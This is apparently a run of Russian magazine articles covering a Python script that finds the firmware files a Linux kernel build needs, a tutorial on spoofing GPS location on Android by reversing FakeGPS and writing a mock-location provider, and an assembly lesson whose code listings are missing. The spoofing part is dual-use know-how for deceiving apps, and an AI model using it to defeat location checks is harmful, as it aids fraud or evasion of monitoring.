   Если у тебя есть устройство, которое требует прошивки, и тебе нужно, что‐
бы оно работало, вопрос лицензии прошивки ста новится чисто академичес‐
ким — от необходимости иметь ее в системе и загружать ты никуда
не уйдешь.
  Полный набор из linux‐ﬁrmware занимает более 500 Мбайт в распакован‐
ном виде. При этом каждой отдельно взя той системе тре буется только
небольшая часть этих файлов, остальное — мертвый груз.
  Даже в современном мире с дисками на несколько терабайт еще много
случаев, когда размер имеет значение: встраиваемые сис темы, образы
для загрузки через PXE и подобное. Хорошо, если о board support package
позаботился кто‐то другой, но это не всегда так.
   Если ты точно знаешь полный список нуж ного железа, можно извлечь фай‐
лы вручную. Впрочем, даже в этом случае найти нуж ные файлы может быть
непросто — linux‐ﬁrmware представляет собой не очень структурированную
кучу файлов, и списка соответствия файлов именам модулей ядра там нет.
А если ты хочешь дать пользователям воз можность легко собрать свой
образ, тут и вовсе нет выбора — нужно автомати чес кое решение.
  В этой статье я расскажу о своем способе автомати ческой сборки. Он
неидеален, но автоматизирует большую часть работы, что уже неплохо.
Писать скрипт будем на Python 3.


             INFO

                    Примеры кода в статье упрощенные. Готовый
                      и  работающий  скрипт  ты  можешь  найти
                       на GitHub.


К примеру, можно им просмотреть спи сок прошивок для включенных в
.config драйверов сетевых карт Realtek.


$ make menuconfig
$ make prepare
$ list‐required‐firmware.py ‐s drivers/net/ethernet/realtek/
rtl_nic/rtl8168d‐1.fw
rtl_nic/rtl8168d‐2.fw
rtl_nic/rtl8168e‐1.fw
...


ОСНОВЫ
В ядре Linux нет глобального списка про шивок и кода для их загрузки. Каж‐
дый модуль загружает свои про шивки с помощью функций из семейства re‐
quest_firmware. Логично, если учесть, что процедура загрузки прошивки
у каждого устройства раз ная. Соот ветс твенно, информация о нужных про‐
шивках разбросана по множеству отдель ных фай лов с исходным кодом.
  На первый взгляд, некото рую надежду дает опция сборки FIRMWARE_IN_K‐
ERNEL. Увы, на деле она встра ивает в файл с ядром только файлы, которые ты
явно укажешь в EXTRA_FIRMWARE. Так что файлы все равно сначала придется
найти.
  Поиск по вызовам request_firmware() тоже не очень перспективен.
Некоторые модули поддерживают нес колько раз ных прошивок, да и имя фай‐
ла часто хранится в переменной. В качестве примера можно пос мотреть
на фрагмент кода из драйвера сетевой карты Intel e100.
  К счастью для нас, модули должны ука зывать нуж ные им файлы прошивок
с помощью макроса MODULE_FIRMWARE(). Пример можно найти в e100. Этот
макрос определен в файле include/linux/module.h.
  Именно из вывода этого макроса берет ся информация о прошивках,
которую можно увидеть в выводе утилиты modinfo.


$ sudo modinfo e100 | grep firmware
firmware:       e100/d102e_ucode.bin
firmware:       e100/d101s_ucode.bin
firmware:       e100/d101m_ucode.bin

В ряде случаев можно было бы обойтись одной modinfo. Если у тебя есть
собранное ядро и возможность его загрузить, ты можешь просмотреть вывод
modinfo для каждого нужного модуля. Это не всег да удобно или вообще воз‐
можно, так что мы продолжим искать решение, для которого понадобится
только исходный код ядра.
   Здесь и далее будем считать, что все ненужные модули отключены в кон‐
фиге сборки ядра (Kconﬁg). Если мы собираем образ для конкретной сис‐
темы или ограниченного набора систем, это впол не логичное предположе‐
ние.


ИЩЕМ ИСХОДНИКИ МОДУЛЕЙ
Чтобы собрать список имен файлов про шивок, мы сначала составим список
всех файлов исходного кода ядра, где они исполь зуются. Затем мы прогоним
эти файлы через препроцес сор из GCC, чтобы раскрыть все макросы,
и извлечем собственно имена нуж ных файлов.


Находим все включенные в конфиге модули
Это самая простая часть. Конфиг сборки ядра имеет простой формат
«ключ — значение» вроде CONFIG_IWLWIFI=m. Значение может быть n (не
собирать), y (встроить в ядро) или m (соб рать в виде модуля).
  Нас интересуют толь ко ключи, а какое значение там, y или m, нам не важно.
Поэтому мы можем  выгрести нужные  строки  регулярным выраже нием
(.*)=(?:y|m). В модуле re из Python синтаксис (?:...) используется
для незахватывающих групп (non‐capturing group), так что захвачена будет
только часть в скоб ках из (.*)=.


def load_config(path):
    with open(path, 'r') as f:
        config = f.read()
    targets = re.findall(r'(.*)=(?:y|m)', config)
    return targets


Находим нужные каталоги и файлы исходников
В каждом Makeﬁle можно найти выражения вида obj‐$(CONFIG_SOMETHING)
+= .... Переменные CONFIG_SOMETHING раз реша ются в их значения из кон‐
фига и, соответственно, добавляются в списки целей obj‐y (встроить в ядро)
и obj‐m (оставить модулем).
  В файлах верхнего уровня (вроде drivers/net/wireless/intel/Make‐
file) в качестве значения фигурирует подкаталог с модулем, вроде obj‐$(
CONFIG_IWLWIFI) += iwlwifi/. Внутри катало га с модулем (drivers/net/
wireless/intel/iwlwifi/Makefile)  упомина ется  конечный  объ ектный
файл, наподобие obj‐$(CONFIG_IWLWIFI) += iwlwifi.o. Мы ограничимся
случаем с целью‐катало гом.
  Цели‐каталоги мы будем искать по выражению obj‐\$\((.*)\)\s+\+=\s+
(.*)/(?:\n|$) в Makeﬁle.


def find_enabled_subdirs(config, makefile_path):
    with open(makefile_path, 'r') as f:
        makefile = f.read()


    dir_stmts = re.findall(r'obj‐\$\((.*)\)\s+\+=\s+(.*)/(?:\n|$)',
makefile)
    subdirs = []


    for ds in dir_stmts:
        config_key, src_dir = ds


        if config_key in config:
            subdirs.append(src_dir)


    return subdirs

А что с целями‐файлами? Если мы говорим о модулях из нескольких файлов
в каталоге, то их файлы *.c мы обработаем при обходе самого каталога.
Существуют модули из одного файла, в основном для старых устройств вроде
drivers/net/ethernet/intel/e100.c. Таких модулей весьма немного, так
что мы игнорируем их существование. При желании можно добавить обра‐
ботку подобных случаев, но я не уверен, практично ли это. Лучше мы чуть поз‐
же сделаем так, чтобы их прошивки были включены по умолчанию, а не вык‐
лючены.
   Ну и наконец, нам нужен спо соб отфильтровать файлы, в которых есть
ссылки на прошив ки. Это совсем просто для каждого, кто знаком с регуляр‐
ными выражениями.


def file_loads_firmware(file):
    with open(file, 'r') as f:
        source = f.read()
    if re.search(r'MODULE_FIRMWARE\((.*)\)', source):
        return True

Мы  игнорируем  аргумент макроса MODULE_FIRMWARE. Чаще всего там
не явное имя файла, а другая константа, а то и целое выражение. Поэтому мы
сначала составим список нужных файлов с исходниками, а потом уже будем
разбираться, что с ними делать.
  Осталось собрать воедино функцию для пос троения списка файлов
из указанного каталога, в которых есть ссылки на прошивки.


def collect_source_files(config, path):
    files = []


    makefile = os.path.join(path, "Makefile")


    c_files = glob.glob("{0}/*.c".format(path))
    files = list(filter(file_loads_firmware, c_files))


    enabled_subdirs = find_enabled_subdirs(config, makefile)
    subdirs = glob.glob("{0}/*/".format(path))
    for d in subdirs:
        dir_name = d.rstrip("/")


        if os.path.exists(os.path.join(d, "Makefile")):
            if os.path.basename(dir_name) in enabled_subdirs:
                files = files + collect_source_files(config, d)
        else:
            c_files = glob.iglob("{0}/**/*.c".format(d), recursive=
True)
            files += list(filter(file_loads_firmware, c_files))


    return files

Очень экономит время библиотека glob из стандартной поставки Python 3.
С версии 3.5 у нее есть поддержка рекурсии. Некоторые модули содержат
вложенный каталог с исходниками, а порой и не один. Если в таком каталоге
есть свой Makeﬁle, то это независимый модуль, что мы обрабаты ваем в пер‐
вой ветке условия. Одна ко, если Makeﬁle отсутс твует, это «просто» под‐
каталог, и нам нужны все файлы *.c из него и всех под каталогов. Модуль glob
умеет это не хуже, чем шелл, и выражение **/*.c отлично работает (если
не забыть recursive=True).


ИЗВЛЕКАЕМ ДАННЫЕ О ПРОШИВКАХ
Остается последнее — извлечь собственно имена файлов прошивок. Будем
прогонять файлы с исходным кодом через препроцессор из GCC, чтобы
вместо имен макросов получить готовые стро ки имен файлов из  linux‐
ﬁrmware.
  Вообще, остановить GCC после ста дии препроцессора можно опцией ‐E.
Увы, для этого нужен правиль ный список катало гов с заголовочными фай‐
лами. Некоторые модули, вроде упомянутого iwlwiﬁ, содержат множество вло‐
женных каталогов и используют, кро ме стандартных заголовков ядра, еще и
свои общие файлы, что силь но усложня ет дело.
  Однако в Makeﬁle ядра есть цели для файлов *.i — это как раз фай лы *.c
после обработки препроцессором.
  К примеру, make  drivers/net/wireless/intel/iwlwifi/cfg/9000.i
превратит файл 9000.c в голый C без директив и макросов. Макрос MODULE_‐
FIRMWARE генерирует для полей структуры данных о модуле уникальные име‐
на, которые можно узнать по подстроке __UNIQUE_ID_firmware. Эти строки
мы и будем извле кать.


static const char __UNIQUE_ID_firmware338[] __attribute__((__used__))
__attribute__((section(".modinfo"), unused, aligned(1))) = "firmware"
"=" "iwlwifi‐9000‐pu‐b0‐jf‐b0‐" "46" ".ucode";

Выражение вида const char* hello = "hello" " " "world" — немного
непривычный, но вполне законный способ записи строковых констант, экви‐
валентный const char* hello = "hello world". Нам придется это учесть.


fw_files = []
for sf in source_files:
    i_file = re.sub(r'\.c', r'.i', sf)
    res = subprocess.run(["make {0} 2>&1".format(i_file)], shell=True
, capture_output=True)
    if res.returncode != 0:
        print("Failed to preprocess file {0}".format(sf), file=sys.
stderr)
        print(res.stdout.decode(), file=sys.stderr)
    else:
        with open(i_file, 'r') as f:
            source = f.read()
            fw_statements = re.findall(r'__UNIQUE_ID_firmware.
*"firmware"\s+"="\s+(.*);', source)
            fw_files += list(map(lambda s: re.sub(r'(\s|")', r'', s),
fw_statements))

Из всех способов выполнить внешнюю программу мы воспользовались
самым быстрым и грязным — subprocess.run([command],  shell=True,
capture_output=True). В таких скриптах, где Python, по сути, отбирает
работу у sh, я каждый раз радуюсь, что этот способ там есть.


ЗАКЛЮЧЕНИЕ
Может быть, извлечение данных о прошивках из кода ядра и дос таточно экзо‐
тичная задача. Но даже если сам скрипт тебе не пригодится, вполне веро‐
ятно, ты узнал что‐то новое об организа ции исходно го кода ядра Linux и смо‐
жешь применить мой опыт в своих скриптах автоматизации.
ТРЮКИ

ФИКТИВНЫЙ
   АДРЕС


           КАК ПОДМЕНИТЬ
           ГЕОЛОКАЦИЮ
            НА ANDROID,
        ЧТОБЫ ОБМАНЫВАТЬ
           ПРИЛОЖЕНИЯ





В Android сущес твует замечательная воз‐
можность назначать поставщиком геокоор‐
динат любую программу, и вся система
будет использовать те широту и долготу,
которые  она  выдаст. В  этой  статье  я             Mazay                                                                                              stariy2003@yandex.ru
покажу, как этим пользоваться и как самому
написать программу для спуфин га коор‐
динат GPS.


Идея родилась у меня в процес се написания статьи «Мониторим мониторинг.
Что внутри у приложения для изоляции на дому» — именно тогда я обнаружил
возможность менять пос тавщика координат в операционной сис теме, что
открывает для пользователей мно го интересных воз можностей.
  С точки зрения юзера все очень просто: нужно лишь установить специаль‐
ное приложение, затем включить в настройках режим разработчика и выбрать
установленное приложение в качестве поставщика фиктивного местополо‐
жения. Таких программ великое мно жес тво — от простеньких до довольно
развесистых, умеющих не только подменять координаты на заданные, но и
менять их по расписанию или проигрывать заранее записанные треки, чтобы
имитировать движение телефо на по какому‐то маршруту. В общем, вбивай
запрос «Fake GPS» и выбирай по вку су.
  Сразу предупреждаю: надежность  этого метода не очень  высокая.
При желании можно программно отследить наличие на телефоне такой прог‐
раммы‐поставщика, и если программа серь езная, то просто так обду рить ее
может не получиться.
  Я же захотел разоб рать ся, как имен но работа ет этот механизм, и соз дать
собственное приложение для спу финга. А начал я с того, что посмотрел,
как этот алгоритм реализован в одном из бесплатных при ложений. Не читать
же документацию, верно?


РЕВЕРСИМ FAKEGPS
В качестве подопытного кролика было взя то приложение FakeGPS 5.0.0.
Внешне приложение представляет собой карту, на которой можно установить
маркер в произволь ную точку и с помощью кнопок «Старт» и «Стоп» запускать
или останав ливать трансляцию координат выб ранной точки.
  Вооружившись JEB Decompiler, открываем и смотрим. Первое, что бро‐
сается в глаза, — это наличие в манифесте пермишена android.permis‐
sion.ACCESS_MOCK_LOCATION.


<uses‐permission android:name="android.permission.INTERNET" />
<uses‐permission android:name="android.permission.
ACCESS_NETWORK_STATE" />
<uses‐permission android:name="android.permission.
WRITE_EXTERNAL_STORAGE" />
<uses‐permission android:name="android.permission.WAKE_LOCK" />
<uses‐permission android:name="android.permission.
ACCESS_COARSE_LOCATION" />
<uses‐permission android:name="android.permission.
ACCESS_FINE_LOCATION" />
<uses‐permission android:name="android.permission.
ACCESS_MOCK_LOCATION" />
<uses‐permission android:name="android.permission.WRITE_SETTINGS" />
<uses‐permission android:name="com.android.vending.BILLING" />

В основной активити ничего интерес ного не обнаружено, обычная инициали‐
зация и настройка, но есть сервис с говоря щим названием FakeGPSService.





Попытаемся прор ваться сквозь дебри обфуска ции и посмотреть, что в нем
есть интересного.
  В методе onCreate имеется такой код:


this.f = "gps";
this.d = (LocationManager)this.getSystemService("location");
try {
  if(this.d == null) {
    goto label_46;
  }
  this.d.removeTestProvider(this.f);
  goto label_46;
} catch(IllegalArgumentException | NullPointerException unused_ex) {
  goto label_46;
}


label_46:
if(this.d != null) {
  this.d.addTestProvider(this.f, false, false, false, false, true,
false, false, 0, 5);
  this.d.setTestProviderEnabled(this.f, true);
}

Если проще, то инициализируем LocationManager значением this.getSys‐
temService("location"), затем удаляем тестового провай дера
"gps" функцией removeTestProvider и добавляем заново с помощью фун‐
кции addTestProvider, не забывая пос ле этого включить его функцией
setTestProviderEnabled("gps", true). Всё, тестовый провайдер добав‐
лен и вклю чен. А далее при изменении пользователем координат создаем
и устанавливаем новое местополо жение в функции onEventMainThread:


// Создаем
long v1 = System.currentTimeMillis();
Location v3 = new Location("");
v3.setProvider("gps");
v3.setLatitude(arg10.latitude);
v3.setLongitude(arg10.longitude);
v3.setAltitude(((double)FakeGPSService.p));
v3.setBearing(((float)FakeGPSService.q));
v3.setTime(v1);
v3.setAccuracy(((float)FakeGPSService.o));
v3.setElapsedRealtimeNanos(SystemClock.elapsedRealtimeNanos());


// И устанавливаем
try {
  this.d.setTestProviderLocation(this.f, v3);
  Log.d("GpsMockProvider", v3.toString());
} catch(IllegalArgumentException unused_ex) {
}

Вроде бы все более‐менее ясно, можно приступать к написанию своего про‐
вайдера фиктивных местополо жений.


ПИШЕМ КОД
Сразу скажу, я не ставлю перед собой задачи создать готовое к практичес‐
кому использованию приложение. Я буду делать макет с минимальным
набором функций, который про демонстри рует работос пособность приведен‐
ного способа. Так что фиктивные координаты будем задавать жестко в коде
и устанавливать их один раз при создании провайдера. Кому инте ресно, тот
уже сам допилит до нужного уровня.
   Итак, запускаем Android Studio и соз даем проект с пус той активити.





Добавляем в манифест android.permission.ACCESS_MOCK_LOCATION, после
чего «Студия» начинает ругать ся, что это раз решение дос тупно только сис‐
темным приложениям, да еще может быть добавлено только в тес товый
манифест. Тут можно не заморачиваться, а просто понажимать кнопки
Alt+Shift+Enter и Alt‐Enter, следуя подсказ кам, и «Студия» сама все сделает
за нас. Затем добавляем на стартовую акти вити две кнопки.


<LinearLayout
  android:layout_width="match_parent"
  android:layout_height="wrap_content"
  android:orientation="vertical">
  <Button
    android:id="@+id/btnDelGPS"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:onClick="DelGPS"
    android:text="Удалить провайдер GPS" />
  <Button
    android:id="@+id/btnAddGPS"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:onClick="AddGPS"
    android:text="Добавить провайдер GPS" />
</LinearLayout>

И добавляем соответствующий код.


public class MainActivity extends Activity {
  LocationManager mLocationManager;
  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    // Инициализируем LocationManager
    mLocationManager = (LocationManager) getSystemService(Context.
LOCATION_SERVICE);
  }
  public void AddGPS(View view) {
    // Добавляем тестовый провайдер
    mLocationManager.addTestProvider(LocationManager.GPS_PROVIDER,
false, false,
      false, false, true, true,
      true, android.location.Criteria.POWER_LOW, android.location.
Criteria.ACCURACY_FINE);


    // Включаем тестовый провайдер
    mLocationManager.setTestProviderEnabled(LocationManager.
GPS_PROVIDER, true);


    // Задаем фиктивную точку
    Location newLocation = new Location(LocationManager.GPS_PROVIDER);
    newLocation.setLatitude(55.75578);
    newLocation.setLongitude(37.61786);
    newLocation.setTime(System.currentTimeMillis());
    newLocation.setAccuracy(25);
    newLocation.setElapsedRealtimeNanos(System.nanoTime());
    mLocationManager.setTestProviderLocation(LocationManager.
GPS_PROVIDER, newLocation);
  }
  public void DelGPS(View view) {
    // Удаляем наш тестовый провайдер
    mLocationManager.removeTestProvider(LocationManager.GPS_PROVIDER);
  }
}

Компилируем и устанавливаем. Затем идем в настройки раз работчика
на телефоне, выбираем наше приложение в качес тве поставщика фиктивных
местоположений, трясущимися от волнения (как же, мы же только что написа‐
ли собствен ный поставщик местополо жений!) руками запускаем наше при‐
ложение и жмем кнопку «Добавить провай дер GPS».





Ничего не происходит. Ничего, собственно, и не должно происходить.
   Если приложе ние запус кается не пер вый раз, то возможно падение из‐за
того, что тестовый провайдер с таким именем уже создан. Тогда надо пов‐
торно запустить приложение и удалить провайдер кнопкой «Удалить провай‐
дер GPS», а затем создать его заново кноп кой «Добавить провайдер GPS».
  Я  намеренно  не  стал  добавлять  обработку  таких ошибок,  чтобы
не засорять код, мы же пишем макет, а не финальную версию. Впрочем,
можешь присылать пулл‐реквесты, ссылка на GitHub будет в конце статьи :)


ТЕСТИРУЕМ
Сворачиваем приложение и приступа ем к тестам. Запускаем «Яндекс Карты»
и попадаем точно на Красную площадь, в нулевой километр, как и было
задумано. Ура, получилось!





Ну, почти получилось. Если поп робовать запустить Google Maps, почему‐то
мы попадаем на пло щадь Комсомола в городе Урю пинске. Вернее, понятно,
почему попадаем, непонятно, почему не работа ет наш TestProvider.
   Скажу честно, ответ на этот вопрос я искал несколько дней, но все ока‐
залось довольно просто — надо отключить в настройках телефона геоло‐
кацию Google. Эта настройка позволяет не заморачиваться с выбором про‐
вайдера: телефон сам решает, из какого источника брать координаты.
Начинает с самых точ ных, то есть GPS, затем, если спутниковое позициони‐
рование недоступно, переходит к базовым станциям, затем по сетям Wi‐Fi,
а затем якобы даже использует акселерометр, чтобы найти себя в прос транс‐
тве.
   Итак, пробуем — отклю чаем геоло кацию Google и запускаем «Карты».





Сработало, мы снова на Крас ной пло щади.
   Итак, этот способ поз воляет подменять реальные координаты GPS фик‐
тивными, но хотелось бы решить задачу полностью — подменять местополо‐
жение начисто, без всяких скидок. Что интерес но, наш подопытный кролик
FakeGPS работает корректно независимо от настроек геолокации Google.
Что ж, будем ковырять дальше.


ИСПРАВЛЯЕМ ОШИБКИ
Присмотревшись к сервису FakeGPSService чуть более внимательно, я
заметил, что там еще используется некий GoogleApiClient. Признаюсь,
при первичном анализе я с ходу решил, что он нужен для рекламы, и не стал
больше обращать на него внимание. А еще там есть вот эти два метода:


LocationServices.FusedLocationApi.setMockMode()
LocationServices.FusedLocationApi.setMockLocation()

Кажется, это то, что нужно. Погуглив документацию (от нее все же не уйти!),
выясняем, что FusedLocationApi немножко уста рел и вместо него рекомен‐
дуется использовать FusedLocationProviderClient.
   Что же, попробуем. Добавляем в раздел dependencies файла build.gradle
такую строчку:


implementation 'com.google.android.gms:play‐services‐location:17.0.0'

Интересно, что после добавления этой строчки объем приложе ния вырастает
с 11 Кбайт до 1 Мбайта с хвос тиком.
  В конец функции AddGPS дописываем пару строк.


LocationServices.getFusedLocationProviderClient(this).setMockMode(true
);
LocationServices.getFusedLocationProviderClient(this).setMockLocation(
newLocation);

Компилируем и запускаем — теперь нормально работает и в Google Maps
с вклю ченной геолокацией, и в «Яндекс Картах». Победа!


        WWW

                     •Полный исходный код программы
                    •Библиотека, которая вычисляет фиктивных пос‐
                       тавщиков местоположений
 КОДИНГ





                                                                                   Антон Карев
                                                                                      Эксперт по информационной
                                                                                            безопасности. Область
                                                                                       профессиональных
                                                                                       интересов — технологическая
                                                                                            разведка, аналитика в сфере
                                                                         ИБ и искусственный
                                                                                                    интеллект
                                                                                                vedacoder@mail.ru





ПОГРУЖЕНИЕ В
ASSEMBLER
 ОСВАИВАЕМ АРИФМЕТИЧЕСКИЕ
 ИНСТРУКЦИИ




 Прочитав эту статью, ты научишься пользовать ся ариф‐
 метическими и логическими инструк циями, а также инструк‐
 циями сдвига. Попутно узнаешь, как соз давать подпрог‐
 раммы. А в конце напишешь простенькую игрушку «Угадай
 число».


 Другие статьи курса

  • Погружение в assembler
  • Делаем первые шаги в освоении асма
  • Как работают переменные, режимы адресации, инструкции условного
    перехода



  Большинство тех инструкций, о которых ты узна ешь из этой статьи, принима‐
 ют на входе два аргумента. Каждый отдельно взя тый аргумент — это либо
  регистр, либо память, либо константа. Почти все их сочетания допустимы:
  регистр‐регистр,   регистр‐память,   память‐регистр,   регистр‐константа,
  память‐константа. Единс твенное недопустимое сочетание — память‐память.
    Регистры могут быть 16‐ или 8‐битными. 16‐бит ные регистры: AX, BX, CX,
  DX, SI, DI, BP и SP. 8‐битные регистры: AH, AL, BH, BL, CH, CL, DH и DL.


 ПИШЕМ ВСПОМОГАТЕЛЬНУЮ ПОДПРОГРАММУ
  У всех программ, которые мы с тобой сейчас напишем, есть повторяющееся
  действие: вывести результат на экран. Чтобы не писать код для этого дей‐
  ствия каждый раз заново, давай напишем для него подпрограмму.
    Что такое подпрограмма? Это кусок кода, который выполняет какую‐то
  небольшую задачу. К подпрограмме обычно обра щаются через инструкцию
  call. Все подпрограммы заканчиваются инструкцией ret (RETurn).
    Пока  это  все,  что  тебе  нужно  знать о  подпрограммах.  Конечно,
  по‐хорошему,  когда  пользуешь ся подпрог рамма ми, надо бы понимать
 еще несколько вещей, в час тности что такое указатель стека и как он меня‐
  ется при обращении к подпрограмме. Но пока, в рамках текущего урока,
  давай просто условимся, что если тебе надо нарисовать на экране букву,
  просто вставляй в свой код вот такую инс трукцию.



 Реализация подпрограммы call display_letter представлена ниже. Сох‐
  рани ее в файл library.asm.





 Важ но! В конец всех программ, которые мы напишем, тебе надо будет
  вставлять код из library.asm. К чему это приведет? Все программы будут
  заканчиваться выходом в командную строку, и у них будут подпрограммы
  для вывода символа на экран (из регистра AL) и для считывания символа
  с клавиатуры (результат помещается в регистр AL).


 УЧИМСЯ СКЛАДЫВАТЬ И ВЫЧИТАТЬ
 В качестве аргументов для инструкции сложения давай задействуем регистр
  AL и константу.





  Эта программа выводит на экран цифру 7. Потому что 4 + 3 = 7.
   В качестве аргументов для инструкции вычитания давай возьмем регистр
  AL и константу.





  Эта программа выводит на экран цифру 1. Потому что 4 – 3 = 1.


 ОСВАИВАЕМ ИНСТРУКЦИЮ УМНОЖЕНИЯ
 Инструкция умножения умеет работать с байтами (8‐битные числа) и словами
  (16‐битные числа). Умножаемое — это всег да регистр AL/AX. А множите лем
 может быть либо регистр (любой), либо переменная в памяти.
    Только учти, что если умножаемое у тебя в AL, то множитель дол жен
  быть 8‐битным, а если в AX — 16‐битным. Результат умножения попадает
  либо в AX (когда перемножаем два 8‐битных числа), либо в DX:AX (когда
 перемножаем два 16‐битных числа).
   В примере ниже мы используем два 8‐битных регистра AL (умножаемое)
  и CL (множитель). Результат попадает в 16‐битный регистр AX.





  Эта программа выводит на экран цифру 6. Потому что 3 × 2 = 6.
    Для того чтобы перемножить два 16‐битных чис ла, умножаемое помести
  в AX, а множитель — в CX. Затем вместо mul cl напиши mul cx.
   Обрати внимание, инструкция mul опериру ет беззнаковы ми целыми. Если
  тебе надо перемножить числа со знаком, используй imul.


 РАЗБИРАЕМСЯ С ИНСТРУКЦИЕЙ ДЕЛЕНИЯ
 Инструкция деления умеет работать со сло вами (16‐битные чис ла) и двой‐
 ными словами (32‐битные числа). Делимое — это всегда либо регистр AX,
  либо DX:AX. А делителем может быть либо регистр (любой), либо переменная
  в памяти.
    Только учти, что если делимое у тебя в AX, то делитель дол жен быть 8‐бит‐
  ным, а если в DX:AX — 16‐бит ным.
    Когда ты делишь 16‐битное число на 8‐битное, то результат попадает в AL,
  а остаток — в AH. Если делишь 32‐битное число на 16‐битное, результат
  попадает в AX, остаток — в DX.
   В примере ниже мы используем 16‐битный и 8‐битный регистры. Резуль‐
  тат попадает в AL, остаток в AH.





  Эта программа выводит на экран цифру 3. Потому что 100 / 33 = 3. Если
  хочешь посмотреть, какой остаток получился, добавь вот такую строчку сразу
  после той, где написана инструкция div.




 Бе регись! Инструкция деления может сломать твою программу. Если ты
  сделаешь деление на ноль, то воз никнет сис темная ошибка и твоя прог‐
 рамма вылетит в командную строку.
   Обрати внимание, инструкция div опериру ет беззнаковы ми целыми. Если
  тебе надо разделить числа со знаком, используй idiv.


 ЛОГИЧЕСКИЙ И АРИФМЕТИЧЕСКИЙ СДВИГИ, ЦИКЛИЧЕСКИЙ
 СДВИГ
 Инструкции сдвига (операторы << и >> в язы ках высокого уровня) —
  это самые родные инструкции для процессора. Работают они быс трее, чем
  большинство других инс трукций. Так что если какую‐то часть вычислений
 можно реализовать на них, — особенно если это позволит избежать инструк‐
  ций умножения и деления, — смело их используй.





 Сейчас объясню, как здесь работа ет инструкция сдвига. Представь, что зна‐
  чение регистра AL — это число в двоичной системе счисления. Инструкция
  shl просто сдвигает каждый бит дво ичного числа на одну позицию вле во
  и добавляет справа ноль. А тот бит, который вытесняется слева, попадает
  в флаг CF (Carry Flag; флаг переноса).
    Аналогичным образом работает инструкция shr, но только она сдвигает
  биты регистра вправо, а не влево.
    Есть еще инструкция sar, которая работает почти как shr, но в отличие
  от shr делает не логический, а арифметичес кий сдвиг. Что это значит? Когда
  sar сдвигает бит двоичного числа вправо, то не добавляет ноль, а дублиру ет
  бит, который там был до сдвига. Иногда это может быть и ноль, но не всегда.
   В чем польза от такой хитроумной альтернативы обычному сдвигу вправо?
 В том, что sar позволяет двигать числа со зна ком. Сдви нуть их может и shr,
  вот только в регистре в результате это го получит ся белиберда.
     Ты, наверное, уже понял, что вто рым аргу ментом у всех инструкций сдвига
  указывается количество позиций, на которое нуж но сдвинуть биты регистра.
 Обрати внимание: если указываешь это количес тво цифрой, то это может
  быть только единица. Если хочешь за раз сдвинуть сразу несколько битов,
  воспользуйся регистром CL.





 Еще есть инструкции для циклического сдвига: ror, rcr, rol и rcl. В чем их
  особенность? Биты, выдвигаемые с одно го конца, появляются с другой сто‐
  роны. Циклический сдвиг вправо выпол няется инструкцией ror, а вле во —
  инструкцией rol. rcr/rcl делают то же самое, что ror/rol, только задей‐
  ствуют еще один допол нитель ный бит — CF. Добавляемый бит берется из CF,
  а выдвигаемый попадает в CF.


              INFO

                        У shl (логический сдвиг влево) есть синоним —
                     sal. Две эти инструкции полностью идентичны —
                          вплоть до того, что генерируются в один и тот же
                     машинный код.



 ТРИ ЛОГИЧЕСКИЕ ИНСТРУКЦИИ ПЛЮС ОДНА БЕСПОЛЕЗНАЯ
 В 8088 доступны три логичес кие инс трукции: and, or и xor.





 Инструкция and эквивалентна операто ру & в Си и JavaScript; or — оператору
  |, а xor — операто ру ^.
    Еще есть инструкция not, которая принимает только один параметр. Она
  инвертирует все биты ука занного регистра. (not al эквивалентна оператору
  ~ в Си и JavaScript).





 Кроме того, у 8088 есть инс трукция neg, которая очень похожа на not,
  но только она делает не логическую инверсию, а ариф метичес кую: меняет
  знак у заданного числа.
    Еще в ассемблере есть инструкция, которая не делает совершенно
  ничего. Ты можешь вставить ее в любое мес то своей программы, и она никак
  не повлияет на ход выполнения. Конечно, за исклю чением того, что прог‐
 рамма отработает чуть медленнее. Это инс трукция nop. Можешь поэкспе‐
 риментировать с ней. Вставь ее куда душе угодно пос ле директивы org, и ты
  увидишь, как твоя программа увеличится ровно на один байт (это раз мер
  инструкции No OPeration), но работать будет без изменений.


 ЗНАКОМИМСЯ С ИНСТРУКЦИЯМИ ИНКРЕМЕНТА И ДЕКРЕМЕНТА
 Инструкции инкремента и декремента поз воляют увеличивать или уменьшать
  на единицу значение регистра или зна чение переменной в памяти. Эти инс‐
  трукции работают и с байтами (8 бит), и со сло вами (16 бит).





  Тут мы:
   1. загружаем в AL ASCII‐код цифры ноль, то есть 0x30;
   2. показываем цифру на экра не;
   3. прибавляем к AL единицу;
   4. повторяем шаги 2–3 до тех пор, пока в AL не ока жется 0x39;
   5. показываем текущий символ и делаем все то же самое, что раньше, но в
    обратном порядке;
   6. отнимаем от AL единицу;
   7. выводим на экран то, что получилось;
   8. повторяем до тех пор, пока в AL не ока жется 0x30.

 В итоге программа выводит на экран вот такую строку: 012345678987654321.
   В этой программе есть еще одна новая для тебя инструкция — cmp (CoM‐
  Partion — сравнить). Она работает так же, как инструкция вычитания, но с
 одним значительным отличием: cmp не меняет зна чение регистра. Она меня‐
  ет только биты регистра флагов (Flags).
    Обычно cmp исполь зуется совмес тно с инс трукциями условного перехода,
  такими как je (Jump  if Equal — «прыгнуть, если равно»), jne (Jump  if Not
  Equal — «прыгнуть, если не равно») и подобными.


 ПИШЕМ ПРОСТУЮ ИГРУШКУ «УГАДАЙ ЧИСЛО»
 Ну вот, теперь ты зна ешь достаточно ассемблерных инс трукций, чтобы
  написать несложную игру «Угадай число».
    Как она будет работать? После запуска игры компьютер загадывает число,
  выводит на экран знак вопроса и ждет ответа игро ка. Если число, вве денное
  игроком, отличается от того, которое загадал компьютер, игра снова выводит
  знак вопроса. Когда игрок наконец уга дывает число, программа печатает его
  на экране и добавляет смайлик (знак дво еточия и закрывающую скобку). Вот
 ассемблерный код, который воплощает описанную задумку.





  Как компьютер загадывает число? Он считывает из порта 0x40 псевдослучай‐
  ное число. Этот порт подключен к микросхеме таймера. Таймер без останов‐
  ки отсчитывает такты про цессора. Когда ты считываешь значение с его порта,
  то каждый раз получаешь псевдослучай ное число в диапазоне от 0x00
 до 0xFF. Вот и весь секрет.
    Теперь небольшой организа ционный момент. До сих пор, когда нам
  с тобой нужна была буква, мы задава ли ее шес тнадцатеричным ASCII‐кодом.
 Но у компилятора NASM есть удобная особенность: ты можешь напечатать
 любой символ, заключить его в апос трофы, и NASM сам преобразует его
  в ASCII‐код.
    Давай перепишем нашу  игру, вос пользовавшись этой особенностью
 NASM.





